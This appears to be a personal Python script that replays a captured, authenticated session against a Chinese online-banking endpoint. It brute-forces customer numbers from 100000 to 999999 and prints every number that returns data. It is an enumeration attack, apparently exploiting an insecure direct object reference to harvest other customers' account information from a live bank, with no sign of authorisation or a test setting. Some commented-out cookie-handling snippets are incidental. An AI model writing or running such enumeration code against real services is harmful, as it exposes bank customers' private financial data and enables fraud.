from urllib.request import Request

import requests
import uuid
import time
from http.cookies import SimpleCookie

# cookies = requests.utils.dict_from_cookiejar(req.cookies)  # 转成字典格式
from requests.cookies import get_cookie_header


def get_headers(file="./headers.txt"):
    with open(file, 'r') as f:
        lines = f.readlines()


session = requests.session()


def post_request_session(url, body, headers):
    res = session.post(url, json=body, headers=headers)
    # print(res.cookies.get_dict())
    if res.status_code != 200:
        print("error not 200")
        return
    res_json = res.json()
    if res_json["_Return"] == "000000":
        pops = ["_TaskId", "_Timestamp", "_Return", "_ResDate"]
        for p in pops:
            res_json.pop(p, None)
        if res_json:
            print("success")
            print(body)
    else:
        print("erros")
        print(res_json)


# import requests
# from requests.models import Request
# from requests.cookies import get_cookie_header
# session = requests.session()
# r1 = session.get("https://www.google.com")
# r2 = session.get("https://stackoverflow.com")
# cookie_header1 = get_cookie_header(session.cookies, Request(method="GET", url="https://www.google.com"))
# # '1P_JAR=2022-02-19-18; NID=511=Hz9Mlgl7DtS4uhTqjGOEolNwzciYlUtspJYxQ0GWOfEm9u9x-_nJ1jpawixONmVuyua59DFBvpQZkPzNAeZdnJjwiB2ky4AEFYVV'
# cookie_header2 = get_cookie_header(session.cookies, Request(method="GET", url="https://stackoverflow.com"))
# 'prov=883c41a4-603b-898c-1d14-26e30e3c8774'
if __name__ == "__main__":
    url = 'https://ebank.ncbank.cn/wan/ibs/transfer/cashGatherQry'
    # url = "https://www.baidu.com"
    from burpee import parse_request

    headers, post_data = parse_request("./headers.txt")
    # cookie = headers.pop("Cookie")
    body = {
        "enableFlag": "",
        "coreCifNo": 100000,
        "_ranc": str(uuid.uuid1()),
        "_locale": "zh_CN",
        "channel": "PIBS",
        "_ChannelId": "PIBS"
    }
    res = session.post(url=url, json=body, headers=headers)
    for i in range(100000, 999999):
        body = {
            "enableFlag": "",
            "coreCifNo": str(i),
            "_ranc": str(uuid.uuid1()),
            "_locale": "zh_CN",
            "channel": "PIBS",
            "_ChannelId": "PIBS"
        }
        if i % 100 == 0:
            print(i)
        post_request_session(url, body, headers)
        time.sleep(0.01)
    # print(session.cookies)
    # # print(res.)
    # headers.pop("Cookie")
    # res = session.post(url=url, json=body, headers=headers)
    # print(session.cookies)
    # res = session.post(url=url, json=body, headers=headers)
    # print(session.cookies)
    # res = session.post(url=url, json=body, headers=headers)
    # print(session.cookies)
    # res = session.post(url=url, json=body, headers=headers)
    # print(session.cookies)
    # res = session.post(url=url, json=body, headers=headers)
    # print(session.cookies)

    # cookies = update(SimpleCookie(cookie))
    # print(cookies)
    # for i in range(100000, 100002):
    #     body = {
    #         "enableFlag": "",
    #         "coreCifNo": str(i),
    #         "_ranc": str(uuid.uuid1()),
    #         "_locale": "zh_CN",
    #         "channel": "PIBS",
    #         "_ChannelId": "PIBS"
    #     }
    #     post_request_session(url, body, headers, cookie)

    # cookie_header1 = get_cookie_header(session.cookies, Request(method="GET", url="https://www.google.com"))
    # print(cookie_header1)
    # s = requests.Session()
    # s.get('http://xxxxx.org/cookies/set/sessioncookie/1234')
    # r = s.get("http://xxxx.org/cookies")
    #
    # print(r.text)
    # '{"cookies": {"sessioncookie": "1234"}}'
